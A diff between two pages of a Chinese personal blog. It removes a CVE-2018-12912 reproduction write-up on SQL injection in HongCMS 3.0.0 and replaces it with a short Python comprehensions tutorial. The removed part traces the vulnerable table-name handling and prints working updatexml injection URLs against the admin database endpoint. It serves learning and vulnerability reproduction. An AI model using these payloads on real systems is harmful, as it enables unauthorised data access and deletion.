@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="代码审计," />
+  <meta name="keywords" content="学习," />
 
 
 
@@ -82,16 +82,12 @@
 
 
 <meta property="og:type" content="article">
-<meta property="og:title" content="HongCMS 3.0.0 SQL注入漏洞">
-<meta property="og:url" content="http://yoursite.com/2018/08/30/HongCMS 3.0.0 SQL注入漏洞/index.html">
+<meta property="og:title" content="Python编程">
+<meta property="og:url" content="http://yoursite.com/2018/03/21/python编程/index.html">
 <meta property="og:site_name" content="GFAlisa'Blog">
-<meta property="og:image" content="https://s1.ax1x.com/2018/08/30/PjSH1O.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/08/30/PjSbcD.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/08/30/PjS79K.png">
-<meta property="og:updated_time" content="2018-08-30T07:01:46.511Z">
+<meta property="og:updated_time" content="2018-08-30T07:12:08.509Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HongCMS 3.0.0 SQL注入漏洞">
-<meta name="twitter:image" content="https://s1.ax1x.com/2018/08/30/PjSH1O.png">
+<meta name="twitter:title" content="Python编程">
 
 
 
@@ -121,13 +117,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/30/HongCMS 3.0.0 SQL注入漏洞/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/03/21/python编程/"/>
 
 
 
 
 
-  <title>HongCMS 3.0.0 SQL注入漏洞 | GFAlisa'Blog</title>
+  <title>Python编程 | GFAlisa'Blog</title>
   
 
 
@@ -264,7 +260,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/30/HongCMS 3.0.0 SQL注入漏洞/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/21/python编程/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="GFAlisa">
@@ -281,7 +277,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">HongCMS 3.0.0 SQL注入漏洞</h1>
+          <h1 class="post-title" itemprop="name headline">Python编程</h1>
         
 
         <div class="post-meta">
@@ -293,8 +289,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-30T15:00:36+08:00">
-                2018-08-30
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-21T23:23:27+08:00">
+                2018-03-21
               </time>
             
 
@@ -316,8 +312,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CVE复现/" itemprop="url" rel="index">
-                    <span itemprop="name">CVE复现</span>
+                  <a href="/categories/Python3/" itemprop="url" rel="index">
+                    <span itemprop="name">Python3</span>
                   </a>
                 </span>
 
@@ -355,32 +351,12 @@
       
         <hr>
 <a id="more"></a>
-<h4 id="CVE-2018-12912-HongCMS-3-0-0-SQL注入漏洞"><a href="#CVE-2018-12912-HongCMS-3-0-0-SQL注入漏洞" class="headerlink" title="CVE-2018-12912-HongCMS 3.0.0 SQL注入漏洞"></a>CVE-2018-12912-HongCMS 3.0.0 SQL注入漏洞</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 </p>
-<p>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
-<h5 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h5><p>根据exploit-db给出的exp进行分析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28version%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure>
-<p>根据exp地址是/admin/index.php/database目录下，所以我们使用phpstorm打开，使用全局搜索查找operate参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">public function index()&#123;</div><div class="line">		$this-&gt;PrintInstructions();</div><div class="line"></div><div class="line">		echo &apos;&lt;form method=&quot;post&quot; action=&quot;&apos;.BURL(&apos;database/operate&apos;).&apos;&quot; name=&quot;tables&quot;&gt;</div><div class="line">		&lt;input type=&quot;hidden&quot; name=&quot;dbaction&quot; value=&quot;&quot;&gt;&apos;;</div><div class="line"></div><div class="line">		TableHeader(&apos;数据库列表&apos;);</div><div class="line">		TableRow(array(&apos;选择&apos;, &apos;表名称&apos;, &apos;记录数&apos;, &apos;数据大小&apos;, &apos;索引大小&apos;, &apos;空闲&apos;, &apos;操作&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;), &apos;tr0&apos;);</div><div class="line"></div><div class="line">		$recordsize = $datasize = $indexsize = $freesize = 0;</div><div class="line">		.....</div></pre></td></tr></table></figure>
-<p>这里的BURL(‘database/operate’)和我们的exp的url的参数相似，所以我们跟进BURL()函数，发现是对url进行伪静态处理。</p>
-<p>接下来我们对dbaction参数进行分析，老样子进行全局搜索，发现出现在这最多</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">while($tableinfo = $this-&gt;db-&gt;fetch($gettables))&#123;</div><div class="line">			TableRow(array(&apos;&lt;input type=&quot;checkbox&quot; name=&quot;tablenames[]&quot; value=&quot;&apos; . $tableinfo[&apos;Name&apos;] . &apos;&quot;&gt;&apos;, </div><div class="line">				$tableinfo[&apos;Name&apos;], </div><div class="line">				$tableinfo[&apos;Rows&apos;], </div><div class="line">				DisplayFilesize($tableinfo[&apos;Data_length&apos;]), </div><div class="line">				DisplayFilesize($tableinfo[&apos;Index_length&apos;]), </div><div class="line">				Iif($tableinfo[&apos;Data_free&apos;] &gt; 0, &apos;&lt;b&gt;&apos; . DisplayFilesize($tableinfo[&apos;Data_free&apos;]) . &apos;&lt;/b&gt;&apos;, 0), </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=checktable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;查错&lt;/a&gt;&apos;, </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=optimizetable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;优化&lt;/a&gt;&apos;, </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=repairtable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;修复&lt;/a&gt;&apos;, </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=backuptable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;备份&lt;/a&gt;&apos;, </div><div class="line">				Iif($tableinfo[&apos;Name&apos;] == TABLE_PREFIX . &apos;sessions&apos; OR $tableinfo[&apos;Name&apos;] == TABLE_PREFIX . &apos;vvc&apos;, &apos;&lt;a href=&quot;#&quot; onclick=&quot;&apos;.Confirm(&apos;确定清空此数据库表 &apos; . $tableinfo[&apos;Name&apos;] . &apos; 吗?&apos;, &apos;database/operate?dbaction=emptytable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]).&apos;&quot;&gt;清空&lt;/a&gt;&apos;)));</div></pre></td></tr></table></figure>
-<p>TABLE_PREFIX . ‘vvc’ 这个就是exp中的hong_vvc，由于满足条件所以执行到下面的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public function operate()&#123;</div><div class="line">		$action = ForceStringFrom(&apos;dbaction&apos;);</div><div class="line">		$tablename = ForceStringFrom(&apos;tablename&apos;);</div><div class="line"></div><div class="line">		switch ($action)&#123;</div><div class="line">			case &apos;checktable&apos;:</div><div class="line">				$this-&gt;PrintResults(&apos;数据库表查错&apos;, $this-&gt;TableOperation($tablename, &apos;CHECK&apos;));</div><div class="line">				break;</div><div class="line">				......</div><div class="line">case &apos;emptytable&apos;:</div><div class="line">				$this-&gt;PrintResults(&apos;数据库表清空&apos;, $this-&gt;EmptyTable($tablename));</div><div class="line">				break;</div><div class="line">		&#125;</div></pre></td></tr></table></figure>
-<p>当case = emptytable时，执行了$this-&gt;EmptyTable($tablename)，我们分析下EmptyTable方法的内容，发现使用了``，所以可以使用url编码进行绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">private function EmptyTable($tablename)&#123;</div><div class="line">		$this-&gt;db-&gt;exe(&quot;DELETE FROM `$tablename`&quot;);</div><div class="line">		$msg = &apos;已完成清空数据库表: &apos; . $tablename . &apos;&lt;br/&gt;&apos;;</div><div class="line"></div><div class="line">		return $msg;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
-<h5 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h5><p>HongCMS下载地址<a href="https://github.com/Neeke/HongCMS/" target="_blank" rel="external">https://github.com/Neeke/HongCMS/</a></p>
-<p>按照github作者的安装方法安装HongCMS系统</p>
-<p>安装完成进入管理员后台，找到数据库维护页面</p>
-<p><img src="https://s1.ax1x.com/2018/08/30/PjSH1O.png" alt=""></p>
-<p>exp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28version%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure>
-<p>解码得</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc` where vvcid=1 or updatexml(2，concat(0x7e，(version()))，0) or `</div></pre></td></tr></table></figure>
-<p>所以我们可以查看数据库的版本号</p>
-<p><img src="https://s1.ax1x.com/2018/08/30/PjSbcD.png" alt=""></p>
-<p>或者查询下当前数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28database%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/08/30/PjS79K.png" alt=""></p>
+<h4 id="python小代码"><a href="#python小代码" class="headerlink" title="python小代码"></a>python小代码</h4><h5 id="1-过滤列表中的负数-使用列表解析"><a href="#1-过滤列表中的负数-使用列表解析" class="headerlink" title="1.过滤列表中的负数(使用列表解析)"></a>1.过滤列表中的负数(使用列表解析)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line">data = [randint(<span class="number">-10</span>,<span class="number">10</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>)]</div><div class="line">print(data,end=<span class="string">' '</span>)</div><div class="line"></div><div class="line">filter(<span class="keyword">lambda</span> x: x&gt;=<span class="number">0</span>,data)  <span class="comment">#使用filter，时间长不推荐</span></div><div class="line"></div><div class="line">b = [x <span class="keyword">for</span> x <span class="keyword">in</span> data <span class="keyword">if</span> x&gt;=<span class="number">0</span>]  <span class="comment">#使用列表解析</span></div><div class="line">print(b)</div></pre></td></tr></table></figure>
+<h5 id="2-筛选字典高于90的项-使用字典解析"><a href="#2-筛选字典高于90的项-使用字典解析" class="headerlink" title="2.筛选字典高于90的项(使用字典解析)"></a>2.筛选字典高于90的项(使用字典解析)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line">d = &#123;x : randint(<span class="number">60</span>,<span class="number">100</span>) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>)&#125;</div><div class="line">b = &#123;k : v <span class="keyword">for</span> k,v <span class="keyword">in</span> d.items() <span class="keyword">if</span> v &gt;<span class="number">90</span>&#125;</div><div class="line">print(b)</div></pre></td></tr></table></figure>
+<h5 id="3-集合解析"><a href="#3-集合解析" class="headerlink" title="3.集合解析"></a>3.集合解析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">from random import randint</div><div class="line"></div><div class="line">data = [randint(-10,10) for _ in range(10)]</div><div class="line">s = set(data)</div><div class="line">c = &#123;x for x in s if x % 3 == 0 &#125;</div><div class="line">print(c)</div></pre></td></tr></table></figure>
+<h5 id="4-使用namedtuple为每个元组的值命名"><a href="#4-使用namedtuple为每个元组的值命名" class="headerlink" title="4.使用namedtuple为每个元组的值命名"></a>4.使用namedtuple为每个元组的值命名</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</div><div class="line"></div><div class="line">stu = namedtuple(<span class="string">'stu'</span>,[<span class="string">'name'</span>,<span class="string">'age'</span>,<span class="string">'sex'</span>,<span class="string">'email'</span>])</div><div class="line">s = stu(<span class="string">'jim'</span>,<span class="number">16</span>,<span class="string">'male'</span>,<span class="string">'1@qq.com'</span>)</div><div class="line">print(s.name)</div></pre></td></tr></table></figure>
+<h5 id="二-统计元素出现的频度"><a href="#二-统计元素出现的频度" class="headerlink" title="二 统计元素出现的频度"></a>二 统计元素出现的频度</h5><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30</span>)]</div><div class="line"></div><div class="line">c = dict.fromkeys(data,<span class="number">0</span>)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</div><div class="line">    c[x] += <span class="number">1</span></div><div class="line">print(c)</div></pre></td></tr></table></figure>
+<h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</div><div class="line"></div><div class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30</span>)]</div><div class="line">c2 = Counter(data)</div><div class="line">print(c2)</div><div class="line"><span class="comment">#出现最高的3个字母</span></div><div class="line">c3 = c2.most_common(<span class="number">3</span>)</div><div class="line">print(c3)</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -398,7 +374,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            <a href="/tags/学习/" rel="tag"># 学习</a>
           
         </div>
       
@@ -411,15 +387,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/30/SQL注入漏洞/" rel="next" title="SQL注入漏洞">
-                <i class="fa fa-chevron-left"></i> SQL注入漏洞
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/23/MySQL语法/" rel="prev" title="MySQL语法">
+                MySQL语法 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -580,7 +556,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2018-12912-HongCMS-3-0-0-SQL注入漏洞"><span class="nav-number">1.</span> <span class="nav-text">CVE-2018-12912-HongCMS 3.0.0 SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL注入原理"><span class="nav-number">1.1.</span> <span class="nav-text">SQL注入原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#原理分析"><span class="nav-number">1.2.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#复现步骤"><span class="nav-number">1.3.</span> <span class="nav-text">复现步骤</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#python小代码"><span class="nav-number">1.</span> <span class="nav-text">python小代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-过滤列表中的负数-使用列表解析"><span class="nav-number">1.1.</span> <span class="nav-text">1.过滤列表中的负数(使用列表解析)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-筛选字典高于90的项-使用字典解析"><span class="nav-number">1.2.</span> <span class="nav-text">2.筛选字典高于90的项(使用字典解析)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-集合解析"><span class="nav-number">1.3.</span> <span class="nav-text">3.集合解析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-使用namedtuple为每个元组的值命名"><span class="nav-number">1.4.</span> <span class="nav-text">4.使用namedtuple为每个元组的值命名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二-统计元素出现的频度"><span class="nav-number">1.5.</span> <span class="nav-text">二 统计元素出现的频度</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#方法一"><span class="nav-number">1.5.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法二"><span class="nav-number">1.5.2.</span> <span class="nav-text">方法二</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
